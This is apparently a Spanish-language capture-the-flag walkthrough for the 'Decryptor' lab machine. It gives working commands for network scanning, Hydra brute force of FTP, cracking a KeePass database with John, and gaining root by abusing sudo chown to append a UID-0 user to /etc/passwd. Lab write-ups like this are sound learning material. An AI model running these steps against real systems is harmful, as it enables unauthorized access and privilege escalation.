---
layout: post
title: "Decryptor"
date: 2024-06-21 11:15:23
category: hackerlabs
vm: hackerlabs
---

<table class="log">
  <tr>
    <td rowspan="5"><img src="/notas/public/img/thehackerlabs/thehackerlabs.png" width=260></td>
    <td></td>
  </tr>
  <tr> <td><strong>Máquina:</strong> Decryptor </td> </tr>
  <tr> <td><strong>SO:</strong> Linux</td> </tr>
  <tr> <td><strong>Dificultad:</strong> <span class="easy">Facil</span></td> </tr>
  <tr> <td><strong><a href="https://thehackerslabs.com/decryptor/" target="_blank"> Descarga</a></strong></td> </tr>
</table>

<br>

![img](/notas/public/img/thehackerlabs/Decryptor/host.png){:.margin}

**1\.** Identifico el host en la red.

`sudo arp-scan -I enp2s0 --localnet`

![img](/notas/public/img/thehackerlabs/Decryptor/arp.png){:.margin}

**2\.** Escaneando servicios y puertos activos en la maquina.

`sudo nmap -p- --open -T5 -sCV --min-rate=5000 -n -Pn 192.168.1.8`

![img](/notas/public/img/thehackerlabs/Decryptor/nmap.png){:.margin}

**3\.** Verificando la web que corre apache, en la fuente por debajo encuentro codigo Brainfuck.

`http://192.168.1.8`

![img](/notas/public/img/thehackerlabs/Decryptor/80.png){:.margin}
![img](/notas/public/img/thehackerlabs/Decryptor/80code.png){:.margin}

**4\.** Decodeando en [dcodefr](https://www.dcode.fr/brainfuck-language), este puede ser una posible contraseña.

![img](/notas/public/img/thehackerlabs/Decryptor/dcodefr.png){:.margin}

**5\.** Probe fuerza bruta al ssh sin exito, pero al ftp si se pudo.

`hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p marioeatslettuce ftp://192.168.1.8:2121`

![img](/notas/public/img/thehackerlabs/Decryptor/hydra.png){:.margin}

**6\.** Me conecto por ftp, encuentro una base de datos de [Keepass](https://keepassxc.org/download/#linux), me lo descargo.

`ftp 192.168.1.8 -p 2121`

`dir`

`get user.kdbx`

![img](/notas/public/img/thehackerlabs/Decryptor/ftp.png){:.margin}

**7\.** Crackeando la contraseña de la base de datos.

`kepass2john user.kdbx > key`

`john --wordlist=/usr/share/wordlists/rockyou.txt key`

![img](/notas/public/img/thehackerlabs/Decryptor/john.png){:.margin}

**8\.** Lo abrimos con keepass, y encuentro unas credenciales.

![img](/notas/public/img/thehackerlabs/Decryptor/keepass.png){:.margin}
![img](/notas/public/img/thehackerlabs/Decryptor/keepassok.png){:.margin}

**9\.** Me conecto por ssh como chiquero.

`ssh chiquero@192.168.1.8`

![img](/notas/public/img/thehackerlabs/Decryptor/sshchiquero.png){:.margin}

**10\.** Encuentro un binario que puedo ejecutar como root.

`sudo -l`

![img](/notas/public/img/thehackerlabs/Decryptor/sudol.png){:.margin}

**11\.** Escalando privilegios, [gtfobins](https://gtfobins.github.io/gtfobins/chown/#sudo).

_11.1- Cambio propietario al etc/passwd_

`sudo /usr/bin/chown chiquero:chiquero /etc/passwd`

`ls -l /etc/passwd`

![img](/notas/public/img/thehackerlabs/Decryptor/chown.png){:.margin}

_11.2- Genero una contraseña y agrego un usuario con permisos root, migro a este y ya somos root_

`openssl passwd micontra`

`echo 'super:$1$AFnwwj9w$4m5nsE/FkLlU.gvCtTntR1:0:0::/home/super:/bin/bash' >> /etc/passwd`

`su super`

![img](/notas/public/img/thehackerlabs/Decryptor/root.png){:.margin}

<br>

<a href="#">_Finalizado._</a>